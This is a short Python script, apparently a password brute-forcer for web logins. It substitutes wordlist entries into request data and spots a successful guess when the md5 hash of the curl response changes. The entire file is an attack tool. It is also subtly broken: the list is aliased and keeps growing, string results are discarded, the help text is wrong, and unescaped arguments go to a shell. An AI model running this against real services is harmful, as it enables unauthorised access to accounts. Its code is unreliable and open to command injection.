#!/usr/bin/python

import sys, getopt, os, time

def main(argv):
	pwordlist = ''
	ip = ''
	data = ''
	method = ''
	md5hash = ''
	try:
		opts,	 args = getopt.getopt(argv,"hP:i:d:m:",["pwordlist","ip","data","method"])
	except getopt.GetoptError:
		print('test.py -i <inputfile> -o <outputfile>')
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print('test.py -i <inputfile> -o <outputfile>')
			sys.exit()
		elif opt in ("-P", "--pwordlist"):
			pwordlist = arg
		elif opt in ("-i", "--ip"):
			ip = arg
		elif opt in ("-d","--data"):
			data = arg
		elif opt in ("-m","--method"):
			method = arg

	brutepass(pwordlist, ip, data, md5hash, method)



def brutepass(pwordlist, ip, data, md5hash, method="GET"):
	data = data.split("^PASS^")
	with open("{}".format(pwordlist),'r') as file:
		for line in file:
			tdata=data
			line.split("\n").pop()
			tdata.insert(1,line)
			''.join(tdata)
			tmd5hash=os.popen("curl -s -X {} {} --data {} | md5sum | cut -d ' ' -f 1".format(method, ip, tdata)).read()
			if md5hash=='':
				md5hash=tmd5hash
				print("Initial md5 hash is : {}".format(tmd5hash))
			elif md5hash!=tmd5hash:
				print("Different response for {} input (md5hash : {})".format(line, tmd5hash))
				sys.exit()
			else :
				print("Trying with {}".format(line).split('\n')[0]+" "*100, end='\r')

		print ("\n\n *** Done. ***")

if __name__ == "__main__":
	main(sys.argv[1:])
